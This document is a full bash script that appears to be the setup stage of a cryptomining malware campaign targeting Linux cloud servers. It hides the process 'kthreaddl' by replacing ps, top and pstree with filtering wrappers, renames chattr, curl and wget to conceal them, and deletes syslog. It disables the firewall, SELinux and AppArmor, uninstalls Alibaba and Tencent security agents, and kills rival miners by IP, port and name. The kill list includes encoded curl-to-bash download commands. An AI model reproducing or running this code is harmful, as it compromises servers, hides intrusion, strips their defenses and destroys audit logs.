#!/bin/bash

if [ -x /bin/chattr ];then
	mv /bin/chattr /bin/tntcht
elif [ -x /usr/bin/chattr ];then
	mv /usr/bin/chattr /usr/bin/tntcht
elif [ -f /bin/tntrcht ];then
	mv /bin/tntrecht /bin/tntrech
elif [ -f /usr/bin/tntrecht ];then
	mv /usr/bin/tntrecht /usr/bin/tntrecht
fi
if [ -x /bin/tntcht ];then
	export CHATTR=/bin/tntcht
elif [ -x /usr/bin/tntcht ];then
	export CHATTR=/usr/bin/tntcht
else
	export CHATTR=chattr
fi 

#------------------------------------------------------------
pssize=`ls -l /bin/ps | awk '{ print $5 }'` 
${CHATTR} -i /bin/ps
if [ ${pssize} -le 8000 ];then 
	ps_name=$(awk '/\$@/ {print $1}' /bin/ps)  
	if [ ! "${ps_name}" = "ps.lanigiro" ];then
		mv /bin/${ps_name} /bin/ps.lanigiro
	fi
else 
	mv /bin/ps /bin/ps.lanigiro 
fi 
echo "#!/bin/bash">/bin/ps
echo "ps.lanigiro \$@ | grep -v 'kthreaddl'" >>/bin/ps 
touch -d 20160825 /bin/ps
chmod a+x /bin/ps
${CHATTR} +i /bin/ps  
if [ -x /bin/ps.lanigiro ];then
	PS_CMD="/bin/ps.lanigiro"
fi
#------------------------------------------------------------
topsize=`ls -l /bin/top | awk '{ print $5 }'`
${CHATTR} -i /bin/top
if [ ${topsize} -le 8000 ];then  
	top_name=$(awk '/\$@/ {print $1}' /bin/top)
	if [ ! "${top_name}" = "top.lanigiro" ];then
		mv /bin/${top_name} /bin/top.lanigiro
	fi
else 
	mv /bin/top /bin/top.lanigiro
fi
echo "#!/bin/bash">/bin/top 
echo "top.lanigiro \$@ | grep -v 'kthreaddl'">>/bin/top 
chmod a+x /bin/top
touch -d 20160716 /bin/top
${CHATTR} +i /bin/top 
#------------------------------------------------------------
treesize=`ls -l /bin/pstree| awk '{ print $5 }'`
${CHATTR} -i /bin/pstree
if [ ${treesize} -le 8000 ];then  
	tree_name=$(awk '/\$@/ {print $1}' /bin/pstree)
	if [ ! "${tree_name}" = "pstree.lanigiro" ];then
		mv /bin/${tree_name} /bin/pstree.lanigiro
		echo ${tree_name}
	fi
else  
	mv /bin/pstree /bin/pstree.lanigiro
fi 
echo "#!/bin/bash">/bin/pstree
echo "pstree.lanigiro \$@ | grep -v 'kthreaddl'">>/bin/pstree
chmod +x /bin/pstree
touch -d 20161121 /bin/pstree 
${CHATTR} +i /bin/pstree
#------------------------------------------------------------

if [ -f /bin/curl ];then
    export CURL_CMD="/bin/curl"
elif [ -f /usr/bin/curl ];then
    export CURL_CMD="/usr/bin/curl"
fi
if [ -f /bin/wget ];then
    export WGET_CMD="/bin/wget"
elif [ -f /usr/bin/wget ];then
    export WGET_CMD="/usr/bin/wget"
fi
if [ -x "/usr/bin/wgettnt" -o -x "/bin/wgettnt" ];then
    if [ -f /bin/wgettnt ];then
        export WGET_CMD="/bin/wgettnt"
    elif [ -f /usr/bin/wgettnt ];then
        export WGET_CMD="/bin/wgettnt"
    fi
    mv /bin/wgettnt /bin/wdz || mv /usr/bin/wgettnt /usr/bin/wdz
  
fi
if [ -x "/usr/bin/TNTwget" -o -x "/bin/TNTwget" ];then
    if [ -f /bin/TNTwget ];then
        export WGET_CMD="/bin/TNTwget"
    elif [ -f /usr/bin/TNTwget ];then
        export WGET_CMD="/usr/bin/TNTwget"
    fi
    mv /bin/TNTwget /bin/wdz || mv /usr/bin/TNTwget /usr/bin/wdz
fi
if [ -x "/usr/bin/wge" -o -x "/bin/wge" ];then
    if [ -f /bin/wge ];then
        export WGET_CMD="/bin/wge"
    elif [ -f /usr/bin/wge ];then
        export WGET_CMD="/usr/bin/wge"
    fi
    mv /bin/wge /bin/wdz || mv /usr/bin/wge /usr/bin/wdz
fi
if [ -x "/usr/bin/wd1" -o -x "/bin/wd1" ];then
    if [ -f /usr/bin/wd1 ];then
        export WGET_CMD="/usr/bin/wd1"
    elif [ -f /bin/wd1 ];then
        export WGET_CMD="/bin/wd1"
    fi
    mv /bin/wd1 /bin/wdz || mv /usr/bin/wd1 /usr/bin/wdz 
fi
if [ -x "/usr/bin/wget1" -o -x "/bin/wget1" ];then
    if [ -f /bin/wget1 ];then
        export WGET_CMD="/bin/wget1"
    elif [ -f /usr/bin/wget1 ];then
        export WGET_CMD="/usr/bin/wget1"
    fi
    mv /bin/wget1 /bin/wdz || mv /usr/bin/wget1 /usr/bin/wdz
fi
if [ -x "/usr/bin/wdt" -o -x "/bin/wdt" ];then
    if [ -f /bin/wdt ];then
        export WGET_CMD="/bin/wdt"
    elif [ -f /usr/bin/wdt ];then
        export WGET_CMD="/usr/bin/wdt"
    fi
    mv /bin/wdt /bin/wdz || mv /usr/bin/wdt /usr/bin/wdz
fi
if [ -x "/usr/bin/xget" -o -x "bin/xget" ];then
    if [ -f /bin/xget ];then
        export WGET_CMD="/bin/xget"
    elif [ -f /usr/bin/xget ];then
        export WGET_CMD="/usr/bin/xget"
    fi 
    mv /bin/xget /bin/wdz || /usr/bin/xget /usr/bin/wdz
fi 
if [ -x "/bin/wdz" ];then
    export WGET_CMD="/bin/wdz"
elif [ -x "/usr/bin/wdz" ];then
    export WGET_CMD="/usr/bin/wdz"
else
    if [ $(command -v yum) ];then  
        rpm -e --nodeps wget 
        yum remove -y wget
        yum install -y wget  
    else
        apt-get remove -y wget
        apt-get install -y wget
    fi
    mv /bin/wget /bin/wdz || mv /usr/bin/wget /usr/bin/wdz
    if [ -f /bin/wdz ];then
        export WGET_CMD="/bin/wdz" 
    elif [ -f /usr/bin/wdz ];then
        export WGET_CMD="/usr/bin/wdz"
    fi  
fi

if [ -x "/usr/bin/cd1" -o -x "/bin/cd1" ];then
    if [ -f /bin/cd1 ];then
        export CURL_CMD="/bin/cd1"
    elif [ -f /usr/bin/cd1 ];then
        export CURL_CMD="/usr/bin/cd1"
    fi
    mv /bin/cd1 /bin/cdz || mv /usr/bin/cd1 /usr/bin/cdz
fi
if [ -x "/usr/bin/curl" -o -x "/bin/curl" ];then 
    if [ -f /bin/curl ];then
        export CURL_CMD="/bin/curl"
    elif [ -f /usr/bin/curl ];then
        export CURL_CMD="/usr/bin/curl"
    fi
    mv /bin/curl /bin/cdz || mv /usr/bin/curl /usr/bin/cdz
fi
if [ -x "/usr/bin/cur" -o -x "/bin/cur" ];then
    if [ -f /bin/cur ];then
        export CURL_CMD="/bin/cur"
    elif [ -f /usr/bin/cur ];then
        export CURL_CMD="/usr/bin/cur"
    fi
    mv /bin/cur /bin/cdz || mv /usr/bin/cur /usr/bin/cdz
fi
if [ -x "/usr/bin/TNTcurl" -o -x "/bin/TNTcurl" ];then
    if [ -f /bin/TNTcurl ];then
        export CURL_CMD="/bin/TNTcurl"
    elif [ -f /usr/bin/TNTcurl ];then
        export CURL_CMD="/usr/bin/TNTcurl"
    fi
    mv /bin/TNTcurl /bin/cdz || mv /usr/bin/TNTcurl /usr/bin/cdz
fi
if [ -x "/usr/bin/curltnt" -o -x "/bin/curltnt" ];then
    if [ -f /bin/curltnt ];then 
        export CURL_CMD="/bin/curltnt"
    elif [ -f /usr/bin/curltxt ];then
        export CURL_CMD="/usr/bin/curltnt"
    fi
    mv /bin/curltnt /bin/cdz || mv /usr/bin/curltnt /usr/bin/cdz
fi
if [ -x "/usr/bin/curl1" -o -x "/bin/curl1" ];then
    if [ -f /bin/curl1 ];then
        export CURL_CMD="/bin/curl1"
    elif [ -f /usr/bin/curl1 ];then
        export CURL_CMD="/usr/bin/curl1"
    fi
    mv /bin/curl1 /bin/cdz || mv /usr/bin/curl1 /usr/bin/cdz
fi
if [ -x "/usr/bin/cdt" -o -x "/bin/cdt" ];then
    if [ -f /bin/cdt ];then
        export CURL_CMD="/bin/cdt"
    elif [ -f /usr/bin/cdt ];then
        export CURL_CMD="/usr/bin/cdt"
    fi
    mv /bin/cdt /bin/cdz || mv /usr/bin/cdt /usr/bin/cdz
fi
if [ -x "/usr/bin/xcurl" -o -x "/bin/xcurl" ];then
    if [ -f /bin/xcurl ];then
        export CURL_CMD="/bin/xcurl"
    elif [ -f /usr/bin/xcurl ];then
        export CURL_CMD="/usr/bin/xcurl"
    fi
    mv /bin/xcurl /bin/cdz || mv /usr/bin/xcurl /usr/bin/wdz
fi
if [ -x "/usr/bin/cdz" ];then
    export CURL_CMD="/usr/bin/cdz"
elif [ -x "/bin/cdz" ];then
    export CURL_CMD="/bin/cdz"
else
    if [ $(command -v yum) ];then 
        rpm -e --nodeps curl
        yum remove curl
        yum install -y curl  
    else
        apt-get remove curl
        apt-get install -y  curl
    fi
    mv /bin/curl /bin/cdz || mv /usr/bin/curl /usr/bin/cdz
    if [ -f /bin/cdz ];then
        export CURL_CMD="/bin/cdz"
    elif [ -f /usr/bin/cdz ];then
        export CURL_CMD="/usr/bin/cdz"
    fi
fi 


#------------------------------------------------------------

rm -rf /var/log/syslog 
ufw disable
iptables -F 
sysctl kernel.nmi_watchdog=0  
echo '0' > /proc/sys/kernel/nmi_watchdog  
echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf 

#------------------------------------------------------------

ps aux | grep -v ''|grep -i '[a]liyun'; 
if [ $? -eq 0 ];then
    AEGIS_INSTALL_DIR="/usr/local/aegis"
    #check linux Gentoo os 
    var=`lsb_release -a | grep Gentoo`
    if [ -z "${var}" ]; then 
        var=`cat /etc/issue | grep Gentoo`
    fi
    checkCoreos=`cat /etc/os-release >/dev/null | grep coreos`
    if [ -d "/etc/runlevels/default" -a -n "${var}" ]; then
        LINUX_RELEASE="GENTOO"
    elif [ -f "/etc/os-release" -a -n "${checkCoreos}" ]; then
        LINUX_RELEASE="COREOS"
        AEGIS_INSTALL_DIR="/opt/aegis"
    else 
        LINUX_RELEASE="OTHER"
    fi	 
    stop_aegis_pkill(){
        pkill -9 AliYunDun >/dev/null 2>&1
        pkill -9 AliHids >/dev/null 2>&1
        pkill -9 AliHips >/dev/null 2>&1
        pkill -9 AliNet >/dev/null 2>&1
        pkill -9 AliSecGuard >/dev/null 2>&1
        pkill -9 AliYunDunUpdate >/dev/null 2>&1 
        /usr/local/aegis/AliNet/AliNet --stopdriver
        /usr/local/aegis/alihips/AliHips --stopdriver
        /usr/local/aegis/AliSecGuard/AliSecGuard --stopdriver
        printf "%-40s %40s\n" "Stopping aegis" "[  OK  ]"
    } 
    # can not remove all aegis folder, because there is backup file in globalcfg
    remove_aegis(){
        if [ -d "${AEGIS_INSTALL_DIR}" ];then
            umount ${AEGIS_INSTALL_DIR}/aegis_debug
            rm -rf ${AEGIS_INSTALL_DIR}/aegis_client
            rm -rf ${AEGIS_INSTALL_DIR}/aegis_update
            rm -rf ${AEGIS_INSTALL_DIR}/alihids
            rm -rf ${AEGIS_INSTALL_DIR}/globalcfg/domaincfg.ini
        fi
    } 
    uninstall_service() { 
        if [ -f "/etc/init.d/aegis" ]; then
                /etc/init.d/aegis stop  >/dev/null 2>&1
                rm -f /etc/init.d/aegis 
        fi 
        if [ $LINUX_RELEASE = "GENTOO" ]; then
            rc-update del aegis default 2>/dev/null
            if [ -f "/etc/runlevels/default/aegis" ]; then
                rm -f "/etc/runlevels/default/aegis" >/dev/null 2>&1;
            fi
        elif [ -f /etc/init.d/aegis ]; then
            /etc/init.d/aegis  uninstall
            for ((var=2; var<=5; var++)) ; do
                if [ -d "/etc/rc${var}.d/" ];then
                    rm -f "/etc/rc${var}.d/S80aegis"
                elif [ -d "/etc/rc.d/rc${var}.d" ];then
                    rm -f "/etc/rc.d/rc${var}.d/S80aegis"
                fi
            done
        fi

    } 
    stop_aegis_pkill
    uninstall_service
    remove_aegis
    umount ${AEGIS_INSTALL_DIR}/aegis_debug
    printf "%-40s %40s\n" "Uninstalling aegis"  "[  OK  ]" 
elif ps aux | grep -v grep | grep -i '[y]unjing'; then
    /usr/local/qcloud/stargate/admin/uninstall.sh
    /usr/local/qcloud/YunJing/uninst.sh
    /usr/local/qcloud/monitor/barad/admin/uninstall.sh
fi

#------------------------------------------------------------

if [ ! -f /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh ]; then
    /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop && /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove && rm -rf /usr/local/cloudmonitor	
else
    export ARCHD=amd64
    if [ -f /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCHD} ]; then
        /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCHD} stop && /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCHD} uninstall && rm -rf /usr/local/cloudmonitor	
    else
        echo "ali cloud monitor not running"
    fi
fi

#------------------------------------------------------------

setenforce 0 
echo SELINUX=disabled >/etc/selinux/config 
if [ -f /bin/tntrecht -o -f /usr/bin/tntrecht ];then
    tntrecht -i /bin/tntrecht || thtrecht -i /usr/bin/tntrecht
    mv /bin/tntrecht /bin/tntcht || mv /usr/bin/tntrecht /usr/bin/tntcht
fi
if [ -f /bin/chattr -o -f /usr/bin/chattr ];then
    chattr -i /bin/chattr || chattr -i /usr/bin/chattr
    mv /bin/chattr /bin/tntcht || mv /usr/bin/chattr /usr/bin/tntcht 
    tntcht +i /bin/tntcht ||tntcht +i /usr/bin/tntcht
fi  

#------------------------------------------------------------

service apparmor stop
systemctl disable apparmor
service aliyun.service stop
systemctl disable aliyun.service
systemctl disable c3pool_miner.service
systemctl disable pwnrige.service
systemctl disable dbus.service

#------------------------------------------------------------

${CHATTR} -i /bin/sysdr 
echo 0 > /bin/sysdr
${CHATTR} +i /bin/sysdr
rm -rf /bin/dbused 
rm -rf /etc/systemd/system/*pwnrige*

systemctl daemon-reload   

#------------------------------------------------------------
kill_miner_proc()
{
    netstat -anp | grep 185.71.65.238 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -anp | grep 140.82.52.87 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 % 
    netstat -anp | grep 195.3.146.118 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 % 
    netstat -anp | grep 199.19.226.117 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 % 
    netstat -anp | grep 112.253.11.38 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %  
    netstat -anp | grep :23 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :143 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :443 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :2222 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :3333 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :3347 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :3389 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :5555 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :6665 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :6666 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :6667 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :7777 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :8444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    cat /tmp/.X11-unix/01|xargs -I % kill -9 %
    cat /tmp/.X11-unix/11|xargs -I % kill -9 %
    cat /tmp/.X11-unix/22|xargs -I % kill -9 %
    cat /tmp/.pg_stat.0|xargs -I % kill -9 %
    cat /tmp/.pg_stat.1|xargs -I % kill -9 %
    cat $HOME/data/./oka.pid|xargs -I % kill -9 %
    pkill -f zsvc
    pkill -f pdefenderd
    pkill -f updatecheckerd
    pkill -f kthreaddi
    pkill -f srv00
    pkill -f /tmp/.javae/javae
    pkill -f .javae 
    ${PS_CMD} aux| grep "./oka"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux| grep "postgres: autovacum"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} ax -o command,pid -www| awk 'length($1) == 8'|grep -v bin|grep -v "\["|grep -v "("|grep -v "php-fpm"|grep -v proxymap|grep -v postgres|grep -v postgrey|grep -v kinsing| awk '{print $2}'|xargs -I % kill -9 %
    ${PS_CMD} ax -o command,pid -www| awk 'length($1) == 16'|grep -v bin|grep -v "\["|grep -v "("|grep -v "php-fpm"|grep -v proxymap|grep -v postgres|grep -v postgrey| awk '{print $2}'|xargs -I % kill -9 %
    ${PS_CMD} ax| awk 'length($5) == 8'|grep -v bin|grep -v "\["|grep -v "("|grep -v "php-fpm"|grep -v proxymap|grep -v postgres|grep -v postgrey| awk '{print $1}'|xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '/tmp/sscks' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux| grep "sleep 60"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux| grep "./crun"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -vw kdevtmpfsi | grep -v grep | awk '{if($3>80.0) print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep ':3333' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep ':5555' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'kworker -c\' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'log_' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'systemten' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'netns' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'voltuned' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'darwin' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '/tmp/dl' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '/tmp/ddg' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '/tmp/pprt' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '/tmp/ppol' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '/tmp/65ccE*' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '/tmp/jmx*' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '/tmp/2Ne80*' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'IOFoqIgyC0zmf2UR' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '45.76.122.92' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '51.38.191.178' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '51.15.56.161' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '86s.jpg' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'aGTSGJJp' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'I0r8Jyyt' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'AgdgACUD' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'uiZvwxG8' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'BtwXn5qH' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '3XEzey2T' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 't2tKrCSZ' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'svc' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'HD7fcBgg' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'zXcDajSs' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '3lmigMo' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'AkMK4A2' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'AJ2AkKe' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'HiPxCJRS' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'http_0xCC030' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'http_0xCC031' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'http_0xCC032' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'http_0xCC033' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep "C4iLM4L" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'aziplcr72qjhzvin' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | awk '{ if(substr($11,1,2)=="./" && substr($12,1,2)=="./") print $2 }' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '/boot/vmlinuz' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep "i4b503a52cc5" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep "dgqtrcst23rtdi3ldqk322j2" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep "2g0uv7npuhrlatd" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep "nqscheduler" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep "rkebbwgqpl4npmm" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep -v aux | grep "]" | awk '$3>10.0{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep "2fhtu70teuhtoh78jc5s" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep "0kwti6ut420t" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep "44ct7udt0patws3agkdfqnjm" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep -v "/" | grep -v "-" | grep -v "_" | awk 'length($11)>19{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep "\[^" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep "rsync" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep "watchd0g" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | egrep 'wnTKYg|2t3ik|qW3xT.2|ddg' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep "158.69.133.18:8220" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep "/tmp/java" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'gitee.com' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '/tmp/java' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '104.248.4.162' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '89.35.39.78' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '/dev/shm/z3.sh' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'kthrotlds' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'ksoftirqds' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'netdns' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'watchdogs' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'kinsing' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'redis2' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep -v aux | grep " ps" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep "sync_supers" | cut -c 9-15 | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep "cpuset" | cut -c 9-15 | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep -v aux | grep "x]" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep -v aux | grep "sh] <" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep -v aux | grep " \[]" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '/tmp/l.sh' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '/tmp/zmcat' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'CnzFVPLF' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'CvKzzZLs' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'aziplcr72qjhzvin' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '/tmp/udevd' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'KCBjdXJsIC1vIC0gaHR0cDovLzg5LjIyMS41Mi4xMjIvcy5zaCApIHwgYmFzaCA' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'Y3VybCAtcyBodHRwOi8vMTA3LjE3NC40Ny4xNTYvbXIuc2ggfCBiYXNoIC1zaAo' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'sustse' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'sustse3' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '2mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '2mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'cr5.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'cr5.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'logo9.jpg' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'logo9.jpg' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'j2.conf' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'luk-cpu' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'luk-cpu' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'ficov' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'ficov' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'he.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'he.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
